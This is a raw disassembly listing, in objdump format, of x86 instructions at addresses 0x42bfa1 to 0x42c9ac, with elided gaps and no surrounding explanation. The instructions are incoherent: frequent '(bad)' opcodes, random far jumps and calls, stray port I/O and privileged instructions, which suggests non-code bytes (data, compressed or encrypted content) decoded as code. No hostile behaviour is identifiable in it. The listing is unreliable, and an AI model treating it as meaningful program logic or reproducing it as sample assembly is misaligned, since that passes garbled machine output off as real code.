  42bfa1:	xor    DWORD PTR [edi+0x7dad2196],esi
  42bfa7:	ret    0xb09f
  42bfaa:	dec    eax
  42bfab:	push   ecx
  42bfac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bfad:	jl     0x42c012
  42bfaf:	ins    BYTE PTR es:[edi],dx
  42bfb0:	rcr    DWORD PTR [ebx-0x2e9dc26a],0xd6
  42bfb7:	sbb    al,0x42
  42bfb9:	xor    DWORD PTR [esi-0x1de2f234],ecx
  42bfbf:	ds ret 0x27be
  42bfc3:	pop    eax
  42bfc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfc5:	sti    
  42bfc6:	leave  
  42bfc7:	iret   
  42bfc8:	clc    
  42bfc9:	(bad)  
  42bfca:	xlat   BYTE PTR ds:[ebx]
  42bfcb:	sahf   
  42bfcc:	es test eax,0xb63ebceb
  42bfd2:	jge    0x42c048
  42bfd4:	push   eax
  42bfd5:	test   DWORD PTR [ebx],esp
  42bfd7:	std    
  42bfd8:	lock push cs
  42bfda:	xchg   dl,al
  42bfdc:	gs (bad) 
  42bfde:	retf   0xb0ec
  42bfe1:	out    dx,eax
  42bfe2:	cdq    
  42bfe3:	retf   0xfc4
  42bfe6:	inc    esi
  42bfe7:	jge    0x42c017
  42bfe9:	xor    eax,0x4e965318
  42bfee:	fs mov BYTE PTR cs:[edi-0x64118602],bh
  42bff6:	inc    edi
  42bff7:	scas   eax,DWORD PTR es:[edi]
  42bff8:	jns    0x42bfbb
  42bffa:	push   edx
  42bffb:	adc    al,0xec
  42bffd:	sub    al,0x43
  42bfff:	fnsave [edi-0x3c8cda40]
  42c005:	pushaw 
  42c007:	and    DWORD PTR [ecx+0xed3a8be],ebp
  42c00d:	cmp    eax,DWORD PTR [ecx+ecx*2+0x0]
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	jo     0x42c063
  42c082:	inc    esi
  42c084:	loopne 0x42c05c
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	fsubr  QWORD PTR [edx+0x43]
  42c08f:	cwde   
  42c090:	xchg   ebx,edi
  42c092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c093:	jne    0x42c027
  42c095:	inc    edx
  42c096:	mov    ah,BYTE PTR [ecx+0x1f1c2560]
  42c09c:	xchg   esi,eax
  42c09d:	loope  0x42c0d5
  42c09f:	fwait
  42c0a0:	retf   0xc5fe
  42c0a3:	xor    ax,0x5f72
  42c0a7:	add    ch,0xfd
  42c0aa:	or     BYTE PTR [edx-0x47],ch
  42c0ad:	xor    al,0x9
  42c0af:	(bad)  
  42c0b0:	cwde   
  42c0b1:	sub    BYTE PTR [edi],0x73
  42c0b4:	xor    BYTE PTR [ebx+0x6],0xea
  42c0b8:	lahf   
  42c0b9:	push   ebp
  42c0ba:	pop    eax
  42c0bb:	sbb    BYTE PTR [ecx+ebp*4],bh
  42c0be:	adc    bh,BYTE PTR [ecx+ebx*2]
  42c0c1:	jge    0x42c05b
  42c0c3:	push   edi
  42c0c4:	or     al,0x6a
  42c0c6:	mov    gs,WORD PTR [ecx-0x74ed508b]
  42c0cc:	mov    al,0xa6
  42c0ce:	fld    DWORD PTR [ebp-0x39]
  42c0d1:	mov    al,0x3b
  42c0d3:	add    DWORD PTR [edi+0x1c324f38],ecx
  42c0d9:	retf   0xbc8b
  42c0dc:	cmp    esi,DWORD PTR [edi+0x2125945c]
  42c0e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0e3:	ret    0xe809
  42c0e6:	cmc    
  42c0e7:	mov    ds:0xbd3f002b,al
  42c0ec:	clc    
  42c0ed:	ficom  DWORD PTR ds:0xe371a350
  42c0f3:	(bad)  
  42c0f4:	xor    bl,dl
  42c0f6:	xchg   ecx,eax
  42c0f7:	cs cmp ch,dl
  42c0fa:	and    al,0x8f
  42c0fc:	jne    0x42c100
  42c0fe:	mov    ecx,0x7357303f
  42c103:	rcr    DWORD PTR [eax+0x54],1
  42c106:	aad    0x1f
  42c108:	xor    al,bl
  42c10a:	adc    DWORD PTR [ecx],esi
  42c10c:	xchg   BYTE PTR [edi+0xa06eda],al
  42c112:	dec    ax
  42c114:	jne    0x42c0fb
  42c116:	push   ss
  42c117:	cmp    ebx,DWORD PTR ds:[edx-0x1a9d9c6e]
  42c11e:	sub    BYTE PTR [ebp+0x7b],al
  42c121:	bound  esp,QWORD PTR [eax+esi*1+0x76]
  42c125:	push   ecx
  42c126:	xchg   edx,eax
  42c127:	push   0x4c
  42c129:	daa    
  42c12a:	jbe    0x42c0e4
  42c12c:	ds cmp eax,ebx
  42c12f:	outs   dx,BYTE PTR ds:[esi]
  42c130:	pop    ebx
  42c131:	jb     0x42c17f
  42c133:	inc    esp
  42c134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c135:	push   ecx
  42c136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c137:	jnp    0x42c171
  42c139:	mov    eax,edx
  42c13b:	pop    ecx
  42c13c:	push   0x4dbdeab3
  42c141:	push   ebp
  42c142:	inc    edi
  42c143:	lea    esp,[edx]
  42c145:	jp     0x42c19c
  42c147:	xor    ch,BYTE PTR [ecx-0x33]
  42c14a:	mov    dl,0x46
  42c14c:	jnp    0x42c198
  42c14e:	std    
  42c14f:	(bad)  
  42c151:	mov    dh,0xc8
  42c153:	ret    
  42c154:	dec    edi
  42c155:	mov    dl,0x26
  42c157:	icebp  
  42c158:	sub    dl,bl
  42c15a:	outs   dx,BYTE PTR cs:[esi]
  42c15c:	jmp    0x4b4b:0xa5501061
  42c163:	pusha  
  42c164:	xor    cl,cl
  42c166:	add    al,0x4
  42c168:	retf   0x9407
  42c16b:	in     ax,0x55
  42c16e:	fstp   QWORD PTR [edi+eax*8]
  42c171:	lahf   
  42c172:	xchg   esi,eax
  42c173:	stos   DWORD PTR es:[edi],eax
  42c174:	push   0x4e99ae25
  42c179:	nop
  42c17a:	fstp   QWORD PTR [esi+0x2593d4ea]
  42c180:	leave  
  42c181:	jnp    0x42c185
  42c183:	in     al,0xf2
  42c185:	loopne 0x42c128
  42c187:	leave  
  42c188:	fild   QWORD PTR [ecx]
  42c18a:	mov    ds:0x814a46f,al
  42c18f:	lods   eax,DWORD PTR ds:[esi]
	...
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	mov    ds:0xe43040b0,al
  42c205:	xlat   BYTE PTR ds:[ebx]
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	push   0x99d054bc
  42c211:	add    edi,ebx
  42c213:	jne    0x42c20a
  42c215:	pmovmskb ebx,mm5
  42c218:	test   BYTE PTR [edx+0x41],0xab
  42c21c:	int    0x8a
  42c21e:	xchg   BYTE PTR [ecx-0x453cf173],bh
  42c224:	inc    eax
  42c225:	mov    dl,0xf6
  42c227:	xor    cl,BYTE PTR [esi-0x2b]
  42c22a:	adc    edx,DWORD PTR [esi+eiz*4]
  42c22d:	in     eax,dx
  42c22e:	nop
  42c22f:	pop    ebx
  42c230:	inc    ebx
  42c231:	or     BYTE PTR [esi+0x56d2ef00],0xc3
  42c238:	imul   edx,ecx,0x714c5989
  42c23e:	enter  0x887f,0x55
  42c242:	xchg   ebp,eax
  42c243:	dec    esp
  42c244:	jbe    0x42c268
  42c246:	and    DWORD PTR [ebx],ebx
  42c248:	stos   BYTE PTR es:[edi],al
  42c249:	mov    bh,0xe4
  42c24b:	mov    bh,0x2e
  42c24d:	mov    ebp,0x66649c4d
  42c252:	mov    WORD PTR [ebx],?
  42c254:	dec    ebx
  42c255:	sub    esi,DWORD PTR [eax]
  42c257:	adc    eax,0xbfd77c25
  42c25c:	fistp  QWORD PTR [edi*2+0x177bc900]
  42c263:	pop    edi
  42c264:	jo     0x42c28c
  42c266:	xchg   esp,eax
  42c267:	cmc    
  42c268:	sbb    DWORD PTR [esi-0x2556e99d],ebx
  42c26e:	les    esp,FWORD PTR [edx+eiz*8]
  42c271:	ja     0x42c2b5
  42c273:	shl    BYTE PTR [edx-0x70a9596f],1
  42c279:	xchg   esp,eax
  42c27a:	loopne 0x42c2b4
  42c27c:	mov    al,ds:0x16c68088
  42c281:	jecxz  0x42c21f
  42c283:	mov    ah,0x3c
  42c285:	and    al,0x9a
  42c287:	mov    BYTE PTR [esi-0x319eda7],cl
  42c28d:	push   ebx
  42c28e:	mov    ds:0xa53e4ffb,al
  42c293:	cmp    bh,cl
  42c295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c296:	sub    DWORD PTR [edi+0x77],esp
  42c299:	or     eax,0x2b2f60d
  42c29e:	pop    edi
  42c29f:	cmp    al,0xcf
  42c2a1:	out    dx,eax
  42c2a2:	mov    al,ds:0xd4632600
  42c2a7:	outs   dx,BYTE PTR ds:[esi]
  42c2a8:	call   0x481b:0xd9332656
  42c2af:	daa    
  42c2b0:	jp     0x42c304
  42c2b2:	adc    ebp,edi
  42c2b4:	mov    ?,WORD PTR [edi-0x248c830b]
  42c2ba:	in     al,dx
  42c2bb:	cdq    
  42c2bc:	ds clc 
  42c2be:	call   0xa471284f
  42c2c3:	out    dx,eax
  42c2c4:	pop    DWORD PTR [eax+0xd]
  42c2c7:	push   0x49862a2
  42c2cc:	jo     0x42c344
  42c2ce:	mov    ah,0x82
  42c2d0:	sub    DWORD PTR [esi+0x2dc7732c],0xb747f31a
  42c2da:	pop    ebx
  42c2db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2dc:	sbb    al,0x21
  42c2de:	push   eax
  42c2df:	popa   
  42c2e0:	sti    
  42c2e1:	gs xor esp,edx
  42c2e4:	stos   BYTE PTR es:[edi],al
  42c2e5:	cld    
  42c2e6:	and    dh,BYTE PTR [ecx+0x74]
  42c2e9:	shl    DWORD PTR [edi],0x34
  42c2ec:	add    DWORD PTR [ebx],0x77dc74b9
  42c2f2:	pop    es
  42c2f3:	arpl   WORD PTR [eax],bx
  42c2f5:	call   0x10df62c
  42c2fa:	cmp    BYTE PTR [esi-0x3e],bl
  42c2fd:	and    dh,BYTE PTR [edi]
  42c2ff:	out    dx,eax
  42c300:	add    BYTE PTR [edi],dl
  42c302:	mov    eax,0x5828655d
  42c307:	push   esp
  42c308:	inc    ch
  42c30a:	dec    ebp
  42c30b:	scas   al,BYTE PTR es:[edi]
  42c30c:	mov    ds:0x5f4d31,eax
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x43731bf6
  42c383:	xchg   eax,ebp
  42c385:	fadd   DWORD PTR [ecx]
  42c387:	add    BYTE PTR [ecx+eax*1],al
  42c38a:	add    BYTE PTR [eax],al
  42c38c:	jae    0x42c32e
  42c38e:	daa    
  42c38f:	inc    ebp
  42c390:	inc    eax
  42c391:	push   ds
  42c392:	fwait
  42c393:	mov    al,ds:0xce89dd27
  42c398:	mov    ebx,0x76250dfb
  42c39d:	leave  
  42c39e:	ss aad 0xd1
  42c3a1:	daa    
  42c3a2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c3a4:	ret    0xe847
  42c3a7:	dec    ecx
  42c3a8:	cwde   
  42c3a9:	popa   
  42c3aa:	into   
  42c3ab:	retf   0x72c0
  42c3ae:	cdq    
  42c3af:	rcr    DWORD PTR [eax],1
  42c3b1:	cmp    al,0x9b
  42c3b3:	push   edi
  42c3b4:	in     eax,dx
  42c3b5:	hlt    
  42c3b6:	cli    
  42c3b7:	jmp    0x42c3f6
  42c3b9:	lds    esi,FWORD PTR ds:0x5e9456c9
  42c3bf:	enter  0xda3b,0xcd
  42c3c3:	stos   DWORD PTR es:[edi],eax
  42c3c4:	fs je  0x42c3c6
  42c3c7:	inc    esp
  42c3c8:	js     0x42c405
  42c3ca:	jne    0x42c3bc
  42c3cc:	rcl    DWORD PTR [eax-0x35],1
  42c3cf:	add    eax,0x6ad785fa
  42c3d4:	sbb    bh,dh
  42c3d6:	xchg   esi,eax
  42c3d7:	outs   dx,DWORD PTR ds:[esi]
  42c3d8:	int    0xe5
  42c3da:	aaa    
  42c3db:	adc    al,0x69
  42c3dd:	sub    dl,BYTE PTR [ebp-0x3]
  42c3e0:	mov    DWORD PTR [edx],ecx
  42c3e2:	or     DWORD PTR [ecx+0x63f24d11],ebp
  42c3e8:	adc    eax,0xea82a6b6
  42c3ed:	add    DWORD PTR [ebx-0xa],edx
  42c3f0:	sbb    eax,0xd177266b
  42c3f5:	test   BYTE PTR [ebx],bl
  42c3f7:	outs   dx,BYTE PTR ds:[esi]
  42c3f8:	mov    ds:0xbd62b33b,eax
  42c3fd:	fild   WORD PTR [esp+eiz*2+0x5d]
  42c401:	add    ebx,DWORD PTR [ebp+0xf]
  42c404:	lock jnp 0x42c43a
  42c407:	mov    al,0xda
  42c409:	adc    edi,DWORD PTR ds:0x85d9df7a
  42c40f:	and    BYTE PTR [ecx-0x7468e36e],cl
  42c415:	adc    ecx,DWORD PTR [ecx+edx*1-0x478b969d]
  42c41c:	cs push cs
  42c41e:	sbb    BYTE PTR [edx-0x421ae110],dh
  42c424:	adc    BYTE PTR [eax+esi*4-0x614c783c],al
  42c42b:	dec    esi
  42c42c:	fs push ebp
  42c42e:	push   ds
  42c42f:	sub    edx,DWORD PTR [ecx]
  42c431:	stos   BYTE PTR es:[edi],al
  42c432:	push   0x27
  42c434:	mov    dl,0x6a
  42c436:	loopne 0x42c3be
  42c438:	sbb    bl,BYTE PTR [ebp+0x3e964fe2]
  42c43e:	jne    0x42c44c
  42c440:	test   eax,0x4560aee8
  42c445:	jns    0x42c422
  42c447:	inc    di
  42c449:	fmul   QWORD PTR [ebp+0x78]
  42c44c:	lds    ebx,FWORD PTR [eax]
  42c44e:	add    ch,BYTE PTR [esi]
  42c450:	je     0x42c4ce
  42c452:	jno    0x42c3dd
  42c454:	data16 sub BYTE PTR [eax+0x17],0x1a
  42c459:	jnp    0x42c43f
  42c45b:	cmp    ecx,DWORD PTR [esi-0x62aecd51]
  42c461:	sbb    al,0x4c
  42c463:	xor    al,0xa1
  42c465:	lock imul edx,DWORD PTR [ebx-0x8],0xffffff80
  42c46a:	jl     0x42c424
  42c46c:	clc    
  42c46d:	out    0x85,al
  42c46f:	jmp    0xa8b5498c
  42c474:	mov    es,WORD PTR [edi]
  42c476:	adc    BYTE PTR [eax+esi*2],ah
  42c479:	mov    ch,0xef
  42c47b:	add    eax,0x8a6f70da
  42c480:	bound  ebp,QWORD PTR [edi]
  42c482:	push   edx
  42c483:	test   BYTE PTR [edx-0x744d9e26],ah
  42c489:	sbb    al,0x35
  42c48b:	pop    esp
  42c48c:	test   al,0x77
  42c48e:	or     al,0xcd
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x7134,0x35
  42c502:	jno    0x42c484
  42c504:	in     al,dx
  42c505:	fld    DWORD PTR [ecx]
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	mov    dl,0x1d
  42c50e:	icebp  
  42c50f:	xor    ah,dh
  42c511:	mov    al,ds:0x6a1f91a3
  42c516:	add    DWORD PTR [ecx],edi
  42c518:	dec    edx
  42c519:	mov    ds:0x71e9e608,eax
  42c51e:	repnz and DWORD PTR [eax+0x3fcc80e0],eax
  42c525:	imul   ecx,DWORD PTR [eax+ebx*4-0x55],0x1d
  42c52a:	int    0x32
  42c52c:	mov    bh,0x5f
  42c52e:	jns    0x42c53b
  42c530:	pop    eax
  42c531:	aas    
  42c532:	and    dl,0xf7
  42c535:	pop    es
  42c536:	call   0xec95:0xe6d58d59
  42c53d:	lods   eax,DWORD PTR ds:[esi]
  42c53e:	xor    BYTE PTR [ebx-0x9],cl
  42c541:	inc    esi
  42c542:	shl    DWORD PTR [ecx+edx*1+0x61],1
  42c546:	sub    eax,0xc9a0cb5
  42c54b:	push   cs
  42c54c:	je     0x42c5c0
  42c54e:	push   0x2b16701e
  42c553:	adc    bl,0xf7
  42c556:	test   eax,0x6b49831a
  42c55b:	fild   DWORD PTR es:[ecx-0x1c]
  42c55f:	ret    
  42c560:	pop    ss
  42c561:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42c563:	mov    ds:0x1770f5de,al
  42c568:	icebp  
  42c569:	ret    0xf6a4
  42c56c:	cmp    ebx,ebx
  42c56e:	xchg   dh,dl
  42c570:	std    
  42c571:	add    DWORD PTR [edx+0x56],ebx
  42c574:	inc    esp
  42c575:	retf   0x83d
  42c578:	fisttp QWORD PTR [edi+0x44]
  42c57b:	test   ebp,esi
  42c57d:	stc    
  42c57e:	loop   0x42c50c
  42c580:	shr    DWORD PTR [edi-0x4e],cl
  42c583:	pop    ds
  42c584:	adc    al,0xe0
  42c586:	inc    esp
  42c587:	shr    BYTE PTR [edi-0x52],1
  42c58a:	mov    dh,0x86
  42c58c:	inc    ebp
  42c58d:	push   es
  42c58e:	sbb    BYTE PTR [edi-0x34],dh
  42c591:	lods   eax,DWORD PTR ds:[esi]
  42c592:	cwde   
  42c593:	and    eax,edi
  42c595:	mov    eax,0x2836a612
  42c59a:	sti    
  42c59b:	mov    cl,0x6b
  42c59d:	imul   ecx,DWORD PTR [eax-0x2a],0x35d86806
  42c5a4:	mov    al,ds:0xf1f90451
  42c5a9:	ret    0x7b07
  42c5ac:	lods   al,BYTE PTR ds:[esi]
  42c5ad:	fwait
  42c5ae:	push   esi
  42c5af:	mov    edi,0xf3b8cfb3
  42c5b4:	xchg   DWORD PTR [ecx+0x4b],eax
  42c5b7:	sub    edi,esp
  42c5b9:	adc    edi,DWORD PTR [ebx-0x49]
  42c5bc:	fdivr  DWORD PTR [ecx+0x3e1d377f]
  42c5c2:	pop    ebx
  42c5c3:	jmp    0x4615:0xa253adc0
  42c5ca:	call   0xe984c100
  42c5cf:	sub    eax,0x59a2c028
  42c5d4:	ins    DWORD PTR es:[edi],dx
  42c5d5:	adc    eax,0xc9e4e21c
  42c5da:	cmp    ecx,DWORD PTR [eax-0x3a483b21]
  42c5e0:	test   BYTE PTR [esi+0x15],bl
  42c5e3:	aas    
  42c5e4:	sub    ch,0x19
  42c5e7:	push   esi
  42c5e8:	sbb    esi,edx
  42c5ea:	mov    ebp,DWORD PTR [ecx]
  42c5ec:	loopne 0x42c5e2
  42c5ee:	mov    ecx,0x2474dbc5
  42c5f3:	fild   QWORD PTR [eax+0x6e]
  42c5f6:	inc    esi
  42c5f7:	xor    eax,0x14ebe7fb
  42c5fc:	ds inc ebx
  42c5fe:	and    BYTE PTR [esi+edi*8],ch
  42c601:	pusha  
  42c602:	(bad)
  42c606:	adc    al,0xb0
  42c608:	or     eax,0x7973432c
  42c60d:	mov    ecx,0x34d2
	...
  42c672:	add    BYTE PTR [eax],al
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x166dfc6b]
  42c681:	sahf   
  42c682:	push   ds
  42c683:	stos   DWORD PTR es:[edi],eax
  42c684:	lock fiadd DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	lods   eax,DWORD PTR ds:[esi]
  42c68d:	in     eax,dx
  42c68e:	add    dh,BYTE PTR [esi+0x14cb8ac1]
  42c694:	scas   al,BYTE PTR es:[edi]
  42c695:	lds    edx,FWORD PTR [esi]
  42c697:	scas   eax,DWORD PTR es:[edi]
  42c698:	fidiv  DWORD PTR [ecx-0x3d6d3102]
  42c69e:	mov    ebp,0x64a02615
  42c6a3:	dec    ebx
  42c6a4:	call   0xa18fc92b
  42c6a9:	or     DWORD PTR [ecx-0x5a57d56f],0x40e33b3b
  42c6b3:	stos   BYTE PTR es:[edi],al
  42c6b4:	jmp    0xf31c:0x270354da
  42c6bb:	in     eax,dx
  42c6bc:	xchg   ebx,eax
  42c6bd:	cld    
  42c6be:	sahf   
  42c6bf:	cmp    ebx,DWORD PTR [edi+ebp*8+0x514fced5]
  42c6c6:	cmp    esi,DWORD PTR [eax+0x2182d53c]
  42c6cc:	mov    edx,0x3d06625c
  42c6d1:	cmp    esi,DWORD PTR [esi+0x53]
  42c6d4:	add    dl,BYTE PTR [ebx-0x2e]
  42c6d7:	sahf   
  42c6d8:	mov    edx,0xb28f74c5
  42c6dd:	(bad)  
  42c6de:	or     cl,BYTE PTR [ebx]
  42c6e0:	add    ah,BYTE PTR [edi-0x7c]
  42c6e3:	inc    edi
  42c6e4:	rcl    DWORD PTR [edi+0x1e],0xb2
  42c6e8:	and    BYTE PTR [eax-0x77],0x72
  42c6ec:	and    eax,0xe6e1b343
  42c6f1:	sub    BYTE PTR [ecx],cl
  42c6f3:	fimul  WORD PTR [eax+0x39]
  42c6f6:	mov    esp,0x573ed3a0
  42c6fb:	stos   DWORD PTR es:[edi],eax
  42c6fc:	cmp    DWORD PTR [ebx+esi*8],ebx
  42c6ff:	icebp  
  42c700:	pop    esi
  42c701:	sub    al,BYTE PTR [eax-0x71]
  42c704:	mov    BYTE PTR [ecx+0x724ee117],bl
  42c70a:	xor    al,0x42
  42c70c:	and    BYTE PTR [ecx-0x15],0x60
  42c710:	inc    edx
  42c711:	out    dx,al
  42c712:	sub    DWORD PTR [edi],ecx
  42c714:	cs lahf 
  42c716:	(bad)  
  42c717:	fdiv   QWORD PTR [ecx-0x673fe3e7]
  42c71d:	cmp    DWORD PTR cs:[ebp-0x5f],eax
  42c721:	push   es
  42c722:	mov    al,BYTE PTR [ebx]
  42c724:	pushf  
  42c725:	popf   
  42c726:	fcom   QWORD PTR [edx-0x3f]
  42c729:	xchg   DWORD PTR [edx],ebp
  42c72b:	mov    cl,0x76
  42c72d:	cwde   
  42c72e:	dec    ebx
  42c72f:	scas   al,BYTE PTR es:[edi]
  42c730:	ja     0x42c775
  42c732:	out    dx,al
  42c733:	mov    al,ds:0x15239567
  42c738:	mov    ds:0xe283f716,eax
  42c73d:	fs sub al,0xa2
  42c740:	jmp    0x2fb4a3c4
  42c745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c746:	pop    gs
  42c748:	fstp   TBYTE PTR [esi]
  42c74a:	mov    bh,0x0
  42c74c:	popf   
  42c74d:	sub    esp,edi
  42c74f:	int3   
  42c750:	mov    DWORD PTR [esi],edx
  42c752:	call   0xf31f:0xde1145ff
  42c759:	rol    BYTE PTR [edx+0x69015972],0x50
  42c760:	or     BYTE PTR [ecx+ebx*2-0x42],0x6f
  42c765:	dec    ebx
  42c766:	or     eax,eax
  42c768:	xor    eax,0xe9ab6be
  42c76d:	aad    0x1
  42c76f:	adc    DWORD PTR [ebx-0x6fcb88cf],esi
  42c775:	mov    eax,0x10b16e33
  42c77a:	fwait
  42c77b:	sar    bl,cl
  42c77d:	call   0xd8795cef
  42c782:	xor    BYTE PTR [ebx+0x35dada3f],al
  42c788:	xor    ecx,ebp
  42c78a:	popf   
  42c78b:	in     eax,0x8f
  42c78d:	inc    ecx
  42c78e:	hlt    
  42c78f:	mov    al,ds:0x0
	...
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	jl     0x42c7c9
  42c802:	pop    edi
  42c803:	xchg   esi,eax
  42c804:	hlt    
  42c805:	fild   DWORD PTR [ecx]
  42c807:	add    BYTE PTR [ecx+eax*1],al
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	cmp    bl,0xbe
  42c80f:	jecxz  0x42c819
  42c811:	mov    dl,0x76
  42c813:	xchg   esi,eax
  42c814:	jge    0x42c7d8
  42c816:	jl     0x42c853
  42c818:	inc    esi
  42c819:	fadd   QWORD PTR gs:[eax]
  42c81c:	jp     0x42c7b6
  42c81e:	ja     0x42c7af
  42c820:	sub    bl,BYTE PTR [bx]
  42c823:	sbb    eax,0x86c1bae5
  42c828:	sub    eax,0xfbcb6816
  42c82d:	adc    esi,DWORD PTR [eax-0x55]
  42c830:	push   ss
  42c831:	mov    ch,0x4b
  42c833:	pop    ecx
  42c834:	stos   DWORD PTR es:[edi],eax
  42c835:	mov    ds:0x6411dff7,eax
  42c83a:	sub    dh,BYTE PTR [edx-0x3f]
  42c83d:	les    esp,FWORD PTR [esi+0x4150a7cc]
  42c843:	push   0xf
  42c845:	fsub   DWORD PTR [eax+0x3fca2fa5]
  42c84b:	retf   0x90bf
  42c84e:	shl    BYTE PTR [edi+0x6],1
  42c851:	push   es
  42c852:	sub    al,0xb8
  42c854:	js     0x42c8b0
  42c856:	test   dl,dl
  42c858:	sti    
  42c859:	or     DWORD PTR [edi+edi*4-0x667d61a5],0xb
  42c861:	adc    al,0xd8
  42c863:	dec    ebp
  42c864:	jo     0x42c877
  42c866:	jne    0x42c7ec
  42c868:	lds    edi,FWORD PTR [edx]
  42c86a:	nop
  42c86b:	shl    BYTE PTR [ebx+0x2b],cl
  42c86e:	test   al,0x1e
  42c870:	ins    BYTE PTR es:[edi],dx
  42c871:	inc    eax
  42c872:	adc    esp,DWORD PTR [esi]
  42c874:	pop    eax
  42c875:	push   eax
  42c876:	inc    edi
  42c877:	pop    ecx
  42c878:	cli    
  42c879:	xchg   esi,eax
  42c87a:	inc    eax
  42c87b:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c87d:	sbb    BYTE PTR [eax-0x54a45eeb],cl
  42c883:	xchg   esp,eax
  42c884:	sub    al,0xd7
  42c886:	test   DWORD PTR [ebx],ebp
  42c888:	in     eax,dx
  42c889:	sti    
  42c88a:	mov    al,ds:0x3211fea4
  42c88f:	mov    bl,0x5
  42c891:	jns    0x42c834
  42c893:	dec    edi
  42c894:	jl     0x42c8c3
  42c896:	mov    dl,0x4
  42c898:	outs   dx,DWORD PTR ds:[esi]
  42c899:	es stc 
  42c89b:	(bad)  
  42c89c:	dec    edi
  42c89d:	rcr    ebp,cl
  42c89f:	daa    
  42c8a0:	in     al,0xdb
  42c8a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8a3:	inc    edx
  42c8a4:	inc    ecx
  42c8a5:	out    0x3c,eax
  42c8a7:	sbb    dl,BYTE PTR [esi]
  42c8a9:	aaa    
  42c8aa:	adc    ebp,DWORD PTR [edx]
  42c8ac:	les    ebx,FWORD PTR [edx+0x69]
  42c8af:	sbb    al,0xda
  42c8b1:	pop    es
  42c8b2:	stc    
  42c8b3:	mov    edx,0x49ce2ed2
  42c8b8:	lea    edi,[esi-0x3f]
  42c8bb:	dec    esi
  42c8bc:	daa    
  42c8bd:	popa   
  42c8be:	and    dh,ah
  42c8c0:	fwait
  42c8c1:	data16 mov ch,0x6f
  42c8c4:	call   0xbd2c825f
  42c8c9:	dec    ebp
  42c8ca:	jge    0x42c872
  42c8cc:	jno    0x42c88a
  42c8ce:	mov    WORD PTR [edx+0x303fb0ac],?
  42c8d4:	add    DWORD PTR [edx+ebx*4-0xf8664],ecx
  42c8db:	mov    dh,0x52
  42c8dd:	adc    eax,0x7990e85b
  42c8e2:	xor    BYTE PTR [eax+ebx*1-0x4d5b59fb],ch
  42c8e9:	mov    ds:0x8b0c2e36,eax
  42c8ee:	jp     0x42c90f
  42c8f0:	mov    WORD PTR [ebx-0x6f6cb911],ds
  42c8f6:	outs   dx,DWORD PTR ds:[esi]
  42c8f7:	ins    BYTE PTR es:[edi],dx
  42c8f8:	adc    al,0xf4
  42c8fa:	sub    ch,cl
  42c8fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8fd:	fcomip st,st(5)
  42c8ff:	dec    eax
  42c900:	or     DWORD PTR ss:[ecx],esi
  42c903:	lods   eax,DWORD PTR ds:[esi]
  42c904:	mov    ah,0xa4
  42c906:	mov    WORD PTR [esi+0x23],ss
  42c909:	xlat   BYTE PTR ds:[ebx]
  42c90a:	imul   esp,ebp,0x26b61464
	...
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0xcf847340
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	ret    
  42c98d:	push   eax
  42c98e:	dec    eax
  42c98f:	rol    BYTE PTR [esi+0x164304e8],0xee
  42c996:	push   ebp
  42c997:	sub    BYTE PTR [ebx],0x15
  42c99a:	(bad)
  42c99f:	iret   
  42c9a0:	xchg   esp,eax
  42c9a1:	outs   dx,DWORD PTR ds:[esi]
  42c9a2:	out    0x1e,al
  42c9a4:	xchg   edx,eax
  42c9a5:	add    edi,DWORD PTR [esi+0xf]
  42c9a8:	pop    ecx
  42c9a9:	xchg   DWORD PTR [eax-0x4f],ecx
  42c9ac:	inc    ecx
